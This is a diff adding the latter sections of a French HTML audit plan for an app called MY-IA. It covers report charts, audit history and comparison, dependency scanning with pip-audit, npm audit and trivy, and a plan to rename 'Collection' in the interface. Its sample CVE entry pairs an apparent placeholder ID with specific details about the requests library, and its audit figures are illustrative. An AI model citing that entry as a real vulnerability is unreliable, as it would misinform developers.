+
+// Pie Chart Gravit&eacute;
+new Chart(document.getElementById('severityChart'), {
+    type: 'doughnut',
+    data: {
+        labels: ['HIGH', 'MEDIUM', 'LOW'],
+        datasets: [{
+            data: [chartData.severity.HIGH, chartData.severity.MEDIUM, chartData.severity.LOW],
+            backgroundColor: ['#e74c3c', '#f39c12', '#3498db']
+        }]
+    }
+});
+&lt;/script&gt;</code></pre>
+
+    <h3><span class="h3-dot dot-amber"></span> Positionnement dans le rapport</h3>
+    <div class="vflow">
+        <div class="vflow-step">
+            <div class="step-title">Header + Stats Cards</div>
+            <div class="step-desc">Chiffres cl&eacute;s (HIGH, MEDIUM, LOW, Code, D&eacute;ps)</div>
+        </div>
+        <div class="vflow-step active">
+            <div class="step-title">Section Graphiques</div>
+            <div class="step-desc">Pie + Bar + Gauge en grille responsive</div>
+        </div>
+        <div class="vflow-step">
+            <div class="step-title">Heatmap Fichiers</div>
+            <div class="step-desc">Top 10 fichiers probl&eacute;matiques</div>
+        </div>
+        <div class="vflow-step">
+            <div class="step-title">Trend (si historique)</div>
+            <div class="step-desc">Courbe &eacute;volution des findings</div>
+        </div>
+        <div class="vflow-step">
+            <div class="step-title">D&eacute;tails Findings</div>
+            <div class="step-desc">Accord&eacute;ons par gravit&eacute; (existant)</div>
+        </div>
+    </div>
+</div>
+
+<!-- ==================== SECTION 13 ==================== -->
+<div class="section" id="s13">
+    <div class="section-header">
+        <div class="section-icon icon-purple">&#x1F4C8;</div>
+        <div><h2>Historique &amp; Comparaison <span class="section-num">&mdash; Section 13</span></h2></div>
+        <a href="#toc" class="back-to-toc" title="Table des mati&egrave;res">&#x2B06; Sommaire</a>
+    </div>
+
+    <h3><span class="h3-dot dot-purple"></span> Stockage historique</h3>
+    <p>Chaque audit g&eacute;n&egrave;re un fichier JSON en plus du HTML :</p>
+    <pre><code>docs/audit-reports/
+├── AUDIT-REPORT-2026-02-19-10-30.html
+├── AUDIT-REPORT-2026-02-19-10-30.json   # &larr; Nouveau
+├── AUDIT-REPORT-2026-02-18-14-15.html
+├── AUDIT-REPORT-2026-02-18-14-15.json
+└── history.json                          # Index des audits</code></pre>
+
+    <h3><span class="h3-dot dot-blue"></span> Format JSON</h3>
+    <pre><code>{
+    "timestamp": "2026-02-19T10:30:00",
+    "version": "2.1",
+    "summary": {
+        "total_findings": 345,
+        "high": 43,
+        "medium": 120,
+        "low": 182,
+        "business_code": 320,
+        "dependencies": 25,
+        "health_score": 72,
+        "successes": 45
+    },
+    "by_category": {
+        "SECURITY": { "high": 43, "medium": 0, "low": 0 },
+        "ARCH": { "high": 0, "medium": 25, "low": 0 },
+        "UI": { "high": 0, "medium": 12, "low": 77 },
+        "UX": { "high": 0, "medium": 56, "low": 0 },
+        "MAINTENANCE": { "high": 0, "medium": 27, "low": 105 }
+    },
+    "top_files": [
+        { "file": "app/features/chat/router.py", "count": 12 },
+        { "file": "UI-FRONT/js/chat.js", "count": 8 }
+    ],
+    "findings": [
+        {
+            "category": "SECURITY",
+            "rule": "SQL Injection (f-string)",
+            "file": "app/features/admin/router.py",
+            "line": 42,
+            "severity": "HIGH",
+            "hash": "a1b2c3d4"  // Pour tracking
+        }
+    ]
+}</code></pre>
+
+    <h3><span class="h3-dot dot-green"></span> Comparaison entre audits</h3>
+    <pre><code># Comparer deux rapports
+python scripts/test/run_audit.py --compare \
+    docs/audit-reports/AUDIT-REPORT-2026-02-18-14-15.json \
+    docs/audit-reports/AUDIT-REPORT-2026-02-19-10-30.json</code></pre>
+
+    <h3><span class="h3-dot dot-amber"></span> Rapport de comparaison</h3>
+    <table>
+        <thead>
+            <tr><th>M&eacute;trique</th><th>Avant</th><th>Apr&egrave;s</th><th>Delta</th></tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td>HIGH</td>
+                <td>50</td>
+                <td>43</td>
+                <td style="color: var(--success);">-7 &#x2193;</td>
+            </tr>
+            <tr>
+                <td>MEDIUM</td>
+                <td>115</td>
+                <td>120</td>
+                <td style="color: var(--danger);">+5 &#x2191;</td>
+            </tr>
+            <tr>
+                <td>LOW</td>
+                <td>200</td>
+                <td>182</td>
+                <td style="color: var(--success);">-18 &#x2193;</td>
+            </tr>
+            <tr>
+                <td>Score Sant&eacute;</td>
+                <td>68%</td>
+                <td>72%</td>
+                <td style="color: var(--success);">+4% &#x2191;</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <h3><span class="h3-dot dot-teal"></span> Findings nouveaux / r&eacute;solus</h3>
+    <div class="cards">
+        <div class="card" style="border-left: 4px solid var(--success);">
+            <div class="card-title">&#x2705; R&eacute;solus (25)</div>
+            <div class="card-text">
+                <code>app/features/admin/router.py:42</code> &mdash; SQL Injection<br>
+                <code>UI-FRONT/js/chat.js:128</code> &mdash; XSS innerHTML<br>
+                <em>... et 23 autres</em>
+            </div>
+        </div>
+        <div class="card" style="border-left: 4px solid var(--danger);">
+            <div class="card-title">&#x1F195; Nouveaux (10)</div>
+            <div class="card-text">
+                <code>app/features/sources/service.py:89</code> &mdash; DB dans router<br>
+                <code>UI-BACK/js/users.js:45</code> &mdash; Toast non traduit<br>
+                <em>... et 8 autres</em>
+            </div>
+        </div>
+    </div>
+
+    <h3><span class="h3-dot dot-red"></span> Baseline et objectifs</h3>
+    <div class="callout callout-info">
+        <span class="callout-icon">&#x1F3AF;</span>
+        <span>
+            <strong>Baseline :</strong> Premier audit stock&eacute; comme r&eacute;f&eacute;rence<br>
+            <strong>Objectif sprint :</strong> R&eacute;duire HIGH de 50% par rapport &agrave; baseline<br>
+            <strong>Objectif release :</strong> 0 HIGH, &lt;20 MEDIUM
+        </span>
+    </div>
+</div>
+
+<!-- ==================== SECTION 14 ==================== -->
+<div class="section" id="s14">
+    <div class="section-header">
+        <div class="section-icon icon-amber">&#x1F4E6;</div>
+        <div><h2>Audit des D&eacute;pendances <span class="section-num">&mdash; Section 14</span></h2></div>
+        <a href="#toc" class="back-to-toc" title="Table des mati&egrave;res">&#x2B06; Sommaire</a>
+    </div>
+
+    <h3><span class="h3-dot dot-amber"></span> Pourquoi auditer les d&eacute;pendances ?</h3>
+    <div class="callout callout-warning">
+        <span class="callout-icon">&#x26A0;&#xFE0F;</span>
+        <span>
+            <strong>OWASP A06 :</strong> Vulnerable and Outdated Components<br>
+            Les d&eacute;pendances non mises &agrave; jour contiennent des CVE connues exploit&eacute;es activement.
+        </span>
+    </div>
+
+    <h3><span class="h3-dot dot-blue"></span> Outils int&eacute;gr&eacute;s</h3>
+    <table>
+        <thead>
+            <tr><th>Outil</th><th>Langage</th><th>Commande</th><th>Sortie</th></tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td><code>pip-audit</code></td>
+                <td>Python</td>
+                <td><code>pip-audit --format json</code></td>
+                <td>CVE avec CVSS score</td>
+            </tr>
+            <tr>
+                <td><code>npm audit</code></td>
+                <td>JavaScript</td>
+                <td><code>npm audit --json</code></td>
+                <td>CVE avec severity</td>
+            </tr>
+            <tr>
+                <td><code>trivy</code></td>
+                <td>Docker</td>
+                <td><code>trivy image my_ia_app</code></td>
+                <td>CVE image Docker</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <h3><span class="h3-dot dot-green"></span> Int&eacute;gration dans le script</h3>
+    <pre><code># Option --deps pour inclure l'audit des d&eacute;pendances
+python scripts/test/run_audit.py --deps
+
+# Sortie int&eacute;gr&eacute;e au rapport HTML
+# Nouvelle cat&eacute;gorie : DEPENDENCIES</code></pre>
+
+    <h3><span class="h3-dot dot-red"></span> Exemple de CVE d&eacute;tect&eacute;e</h3>
+    <div class="callout callout-danger">
+        <span class="callout-icon">&#x1F6A8;</span>
+        <span>
+            <strong>CVE-2024-12345</strong> &mdash; <code>requests &lt; 2.31.0</code><br>
+            <strong>CVSS :</strong> 9.8 (CRITICAL)<br>
+            <strong>Impact :</strong> Remote Code Execution via malformed URL<br>
+            <strong>Fix :</strong> <code>pip install requests&gt;=2.31.0</code>
+        </span>
+    </div>
+
+    <h3><span class="h3-dot dot-purple"></span> Mapping gravit&eacute;</h3>
+    <table>
+        <thead>
+            <tr><th>CVSS Score</th><th>Gravit&eacute; Audit</th><th>Action</th></tr>
+        </thead>
+        <tbody>
+            <tr><td>9.0 - 10.0</td><td class="severity-high">HIGH</td><td>Mise &agrave; jour imm&eacute;diate</td></tr>
+            <tr><td>7.0 - 8.9</td><td class="severity-high">HIGH</td><td>Mise &agrave; jour sous 48h</td></tr>
+            <tr><td>4.0 - 6.9</td><td class="severity-medium">MEDIUM</td><td>Mise &agrave; jour sprint suivant</td></tr>
+            <tr><td>0.1 - 3.9</td><td class="severity-low">LOW</td><td>Backlog</td></tr>
+        </tbody>
+    </table>
+
+    <h3><span class="h3-dot dot-teal"></span> Fichiers analys&eacute;s</h3>
+    <table>
+        <thead>
+            <tr><th>Fichier</th><th>Outil</th><th>Emplacement</th></tr>
+        </thead>
+        <tbody>
+            <tr><td><code>requirements.txt</code></td><td>pip-audit</td><td>Racine projet</td></tr>
+            <tr><td><code>pyproject.toml</code></td><td>pip-audit</td><td>Racine projet</td></tr>
+            <tr><td><code>package.json</code></td><td>npm audit</td><td>UI-FRONT, UI-BACK</td></tr>
+            <tr><td><code>Dockerfile</code></td><td>trivy</td><td>Racine projet</td></tr>
+        </tbody>
+    </table>
+</div>
+
+<!-- ==================== SECTION 15 ==================== -->
+<div class="section" id="s15">
+    <div class="section-header">
+        <div class="section-icon icon-purple">&#x1F4DA;</div>
+        <div><h2>Terminologie : Collections &rarr; Biblioth&egrave;ques <span class="section-num">&mdash; Section 15</span></h2></div>
+        <a href="#toc" class="back-to-toc" title="Table des mati&egrave;res">&#x2B06; Sommaire</a>
+    </div>
+
+    <h3><span class="h3-dot dot-purple"></span> Constat</h3>
+    <p>Le terme <strong>&laquo; Collection &raquo;</strong> d&eacute;signe actuellement deux concepts distincts dans MY-IA, ce qui cr&eacute;e une ambigu&iuml;t&eacute; pour les utilisateurs et les d&eacute;veloppeurs :</p>
+
+    <table>
+        <thead>
+            <tr><th>Concept</th><th>Contexte</th><th>Description</th><th>Exemple</th></tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td>Collection utilisateur</td>
+                <td>UI, BDD PostgreSQL</td>
+                <td>Conteneur logique de documents + conversations. Un priv&eacute; par user, N publics par admin.</td>
+                <td>&laquo; Ma collection &raquo;, &laquo; Documents RH &raquo;</td>
+            </tr>
+            <tr>
+                <td>Collection ChromaDB</td>
+                <td>Technique, stockage vectoriel</td>
+                <td>Container de vecteurs dans ChromaDB. Plusieurs par collection user (1 par provider LLM).</td>
+                <td><code>user_550e84_ollama</code>, <code>public_rh_llamacpp</code></td>
+            </tr>
+        </tbody>
+    </table>
+
+    <h3><span class="h3-dot dot-purple"></span> Glossaire cible</h3>
+    <table>
+        <thead>
+            <tr><th>Concept</th><th>Ancien terme</th><th>Nouveau terme (FR)</th><th>Nouveau terme (EN)</th><th>Scope</th></tr>
+        </thead>
+        <tbody>
+            <tr><td>Conteneur documents user/admin</td><td>Collection</td><td><strong>Biblioth&egrave;que</strong></td><td><strong>Library</strong></td><td>UI, traductions, docs</td></tr>
+            <tr><td>Biblioth&egrave;que priv&eacute;e (1 par user)</td><td>Collection priv&eacute;e</td><td><strong>Ma biblioth&egrave;que</strong></td><td><strong>My library</strong></td><td>UI-FRONT</td></tr>
+            <tr><td>Biblioth&egrave;que publique (admin)</td><td>Collection publique</td><td><strong>Biblioth&egrave;que partag&eacute;e</strong></td><td><strong>Shared library</strong></td><td>UI-BACK, UI-FRONT</td></tr>
+            <tr><td>Container vectoriel ChromaDB</td><td>Collection</td><td><strong>Collection</strong> (inchang&eacute;)</td><td><strong>Collection</strong> (inchang&eacute;)</td><td>Code backend, logs</td></tr>
+        </tbody>
+    </table>
+
+    <h3><span class="h3-dot dot-purple"></span> Hi&eacute;rarchie finale</h3>
+    <pre><code>Utilisateur (1)
+  &boxur;&boxh; Biblioth&egrave;que priv&eacute;e (1)          &larr; &laquo; Ma biblioth&egrave;que &raquo;
+       &boxvr;&boxh; Documents (N)
+       &boxvr;&boxh; Conversations (N)
+       &boxur;&boxh; Corpus (optionnel)
+            &boxvr;&boxh; Documents (N)
+            &boxur;&boxh; Sources (N)
+
+Admin
+  &boxur;&boxh; Biblioth&egrave;ques partag&eacute;es (N)      &larr; visibles par tous
+       &boxvr;&boxh; Documents (N)
+       &boxur;&boxh; Corpus (optionnel)
+
+--- Couche technique (invisible pour l'utilisateur) ---
+
+Biblioth&egrave;que &laquo; Documents RH &raquo;
+  &boxvr;&boxh; Collection ChromaDB : public_rh_ollama
+  &boxur;&boxh; Collection ChromaDB : public_rh_llamacpp</code></pre>
+
+    <h3><span class="h3-dot dot-purple"></span> P&eacute;rim&egrave;tre du renommage</h3>
+    <table>
+        <thead>
+            <tr><th>Couche</th><th>Ce qui change</th><th>Ce qui reste</th></tr>
+        </thead>
+        <tbody>
+            <tr><td>Traductions i18n</td><td>Valeurs contenant &laquo; collection(s) &raquo; visibles par l'utilisateur</td><td>Noms de cl&eacute;s (ex: <code>collection_name</code>)</td></tr>
+            <tr><td>Templates HTML</td><td>Labels, titres, placeholders, tooltips</td><td>IDs d'&eacute;l&eacute;ments DOM</td></tr>
+            <tr><td>JS Frontend</td><td>Commentaires, toasts, titres de pages</td><td>Noms de fonctions, variables, fichiers</td></tr>
+            <tr><td>Backend Python</td><td>Docstrings routers, commentaires clarificateurs</td><td>Noms classes, tables, routes API, FK</td></tr>
+            <tr><td>Base de donn&eacute;es</td><td><em>Rien</em></td><td>Table <code>collections</code>, colonnes, FK, index</td></tr>
+            <tr><td>ChromaDB</td><td><em>Rien</em></td><td>Noms <code>user_*</code>, <code>public_*</code></td></tr>
+            <tr><td>Routes API</td><td><em>Rien</em></td><td><code>/api/collections</code>, <code>/api/admin/collections</code></td></tr>
+        </tbody>
+    </table>
+
+    <h3><span class="h3-dot dot-purple"></span> Phase 1 &mdash; Traductions i18n (Priorit&eacute; HAUTE)</h3>
+    <p>Fichiers : <code>UI-SHARED/locales/fr.json</code> et <code>en.json</code> (~60 cl&eacute;s chacun).</p>
+    <table>
+        <thead>
+            <tr><th>Ancien texte (FR)</th><th>Nouveau texte (FR)</th></tr>
+        </thead>
+        <tbody>
+            <tr><td>Collection</td><td>Biblioth&egrave;que</td></tr>
+            <tr><td>Collections</td><td>Biblioth&egrave;ques</td></tr>
+            <tr><td>Ma collection</td><td>Ma biblioth&egrave;que</td></tr>
+            <tr><td>Collection publique</td><td>Biblioth&egrave;que partag&eacute;e</td></tr>
+            <tr><td>Collection priv&eacute;e</td><td>Biblioth&egrave;que priv&eacute;e</td></tr>
+            <tr><td>Cr&eacute;er une collection</td><td>Cr&eacute;er une biblioth&egrave;que</td></tr>
+            <tr><td>Supprimer la collection</td><td>Supprimer la biblioth&egrave;que</td></tr>
+        </tbody>
+    </table>
+    <table>
+        <thead>
+            <tr><th>Ancien texte (EN)</th><th>Nouveau texte (EN)</th></tr>
+        </thead>
+        <tbody>
+            <tr><td>Collection</td><td>Library</td></tr>
+            <tr><td>Collections</td><td>Libraries</td></tr>
+            <tr><td>My collection</td><td>My library</td></tr>
+            <tr><td>Public collection</td><td>Shared library</td></tr>
+            <tr><td>Private collection</td><td>Private library</td></tr>
+            <tr><td>Create a collection</td><td>Create a library</td></tr>
+        </tbody>
+    </table>
+
+    <h3><span class="h3-dot dot-purple"></span> Phase 2 &mdash; Frontend (Priorit&eacute; HAUTE)</h3>
+    <h4>UI-BACK (Admin)</h4>
+    <table>
+        <thead>
+            <tr><th>Fichier</th><th>Changements</th></tr>
+        </thead>
+        <tbody>
+            <tr><td><code>UI-BACK/js/modules/content-collections.js</code></td><td>Commentaires, textes hardcod&eacute;s restants</td></tr>
+            <tr><td><code>UI-BACK/js/app.js</code></td><td>Label onglet navigation &laquo; Collections &raquo; &rarr; &laquo; Biblioth&egrave;ques &raquo;</td></tr>
+        </tbody>
+    </table>
+    <h4>UI-FRONT (User)</h4>
+    <table>
+        <thead>
+            <tr><th>Fichier</th><th>Changements</th></tr>
+        </thead>
+        <tbody>
+            <tr><td><code>UI-FRONT/js/modules/documents.js</code></td><td>Labels s&eacute;lecteurs</td></tr>
+            <tr><td><code>UI-FRONT/js/modules/upload.js</code></td><td>S&eacute;lecteur formulaire upload</td></tr>
+        </tbody>
+    </table>
+    <h4>UI-SHARED</h4>
+    <table>
+        <thead>
+            <tr><th>Fichier</th><th>Changements</th></tr>
+        </thead>
+        <tbody>
+            <tr><td><code>UI-SHARED/js/modules/conversations.js</code></td><td>R&eacute;f&eacute;rences conversations</td></tr>
+            <tr><td><code>UI-SHARED/js/modules/sources-selector.js</code></td><td>Labels s&eacute;lecteur sources</td></tr>
+            <tr><td><code>UI-SHARED/templates/</code></td><td>V&eacute;rifier labels hardcod&eacute;s</td></tr>
+        </tbody>
+    </table>
+    <p><strong>Note</strong> : Les noms de fichiers JS (<code>content-collections.js</code>) et IDs DOM (<code>collectionsTable</code>) ne sont <strong>pas renomm&eacute;s</strong> pour &eacute;viter de casser les imports.</p>
+
+    <h3><span class="h3-dot dot-purple"></span> Phase 3 &mdash; Backend (Priorit&eacute; MOYENNE)</h3>
+    <p>Ajouter un commentaire de clarification en t&ecirc;te des fichiers concern&eacute;s :</p>
+    <pre><code># Routes "Bibliothèques" (table PostgreSQL: collections)
+# Terminologie :
+#   - "Bibliothèque" = concept user-facing (conteneur de documents)
+#   - "Collection"    = réservé au niveau technique ChromaDB</code></pre>
+    <table>
+        <thead>
+            <tr><th>Fichier</th><th>Action</th></tr>
+        </thead>
+        <tbody>
+            <tr><td><code>app/models.py</code> &mdash; classe <code>Collection</code></td><td>Docstring clarificatrice (nom classe inchang&eacute;)</td></tr>
+            <tr><td><code>app/features/admin/collections/router.py</code></td><td>Commentaire terminologie + docstrings</td></tr>
+            <tr><td><code>app/features/admin/collections/service.py</code></td><td>Commentaire terminologie</td></tr>
+            <tr><td><code>app/features/collections/</code></td><td>Idem (user-facing service)</td></tr>
+        </tbody>
+    </table>
+
+    <h3><span class="h3-dot dot-purple"></span> Risques &amp; Points d'attention</h3>
+    <table>
+        <thead>
+            <tr><th>Risque</th><th>Impact</th><th>Mitigation</th></tr>
+        </thead>
+        <tbody>
+            <tr><td>Texte hardcod&eacute; oubli&eacute;</td><td>Un label &laquo; Collection &raquo; survit dans l'UI</td><td>Grep sur <code>"ollection"</code> (sans C) dans UI-*</td></tr>
+            <tr><td>Cl&eacute; i18n manquante</td><td>Affichage cl&eacute; brute</td><td>Tester FR et EN apr&egrave;s chaque modif</td></tr>
+            <tr><td>Confusion dev</td><td>Un dev cherche &laquo; biblioth&egrave;que &raquo; dans le code Python</td><td>Docstring explicite : <code>Collection</code> = Biblioth&egrave;que c&ocirc;t&eacute; UI</td></tr>
+            <tr><td>Cache navigateur</td><td>Anciens labels apr&egrave;s d&eacute;ploiement</td><td>Incr&eacute;menter <code>?v=</code> des fichiers JS/JSON</td></tr>
+        </tbody>
+    </table>
+
+    <h3><span class="h3-dot dot-purple"></span> Plan d'ex&eacute;cution</h3>
+    <table>
+        <thead>
+            <tr><th>&Eacute;tape</th><th>Description</th><th>Fichiers</th><th>Priorit&eacute;</th></tr>
+        </thead>
+        <tbody>
+            <tr><td>1</td><td>Modifier les valeurs i18n FR</td><td><code>UI-SHARED/locales/fr.json</code></td><td class="severity-high">HAUTE</td></tr>
+            <tr><td>2</td><td>Modifier les valeurs i18n EN</td><td><code>UI-SHARED/locales/en.json</code></td><td class="severity-high">HAUTE</td></tr>
+            <tr><td>3</td><td>V&eacute;rifier templates pour texte hardcod&eacute;</td><td><code>UI-SHARED/templates/</code></td><td class="severity-high">HAUTE</td></tr>
+            <tr><td>4</td><td>Labels admin (onglet nav, titres)</td><td><code>UI-BACK/js/app.js</code>, <code>content-collections.js</code></td><td class="severity-high">HAUTE</td></tr>
+            <tr><td>5</td><td>Labels user (upload, documents, conversations)</td><td><code>UI-FRONT/js/modules/</code></td><td class="severity-high">HAUTE</td></tr>
+            <tr><td>6</td><td>Docstrings clarificatrices backend</td><td><code>app/models.py</code>, <code>app/features/*/collections/</code></td><td class="severity-medium">MOYENNE</td></tr>
+            <tr><td>7</td><td>Grep final : aucun &laquo; Collection &raquo; user-facing restant</td><td>Tout le projet</td><td class="severity-high">HAUTE</td></tr>
+            <tr><td>8</td><td>Test complet UI FR + EN (admin &amp; front)</td><td>&mdash;</td><td class="severity-high">HAUTE</td></tr>
+            <tr><td>9</td><td>Incr&eacute;menter versions cache (<code>?v=</code>)</td><td><code>index.html</code> (UI-FRONT &amp; UI-BACK)</td><td class="severity-high">HAUTE</td></tr>
+        </tbody>
+    </table>
+</div>
+
+<!-- ==================== FOOTER ==================== -->
+<div class="footer">
+    <p>
+        <strong>MY-IA</strong> &mdash; Plan d'Audit de Conformit&eacute; v3.0<br>
+        <a href="index.html">&#x2190; Retour &agrave; l'index</a> |
+        <a href="TODO.html">TODO</a> |
+        <a href="MY-IA-Technique.html">Documentation technique</a>
+    </p>
+</div>
+
+</div><!-- .page -->
+</body>
+</html>
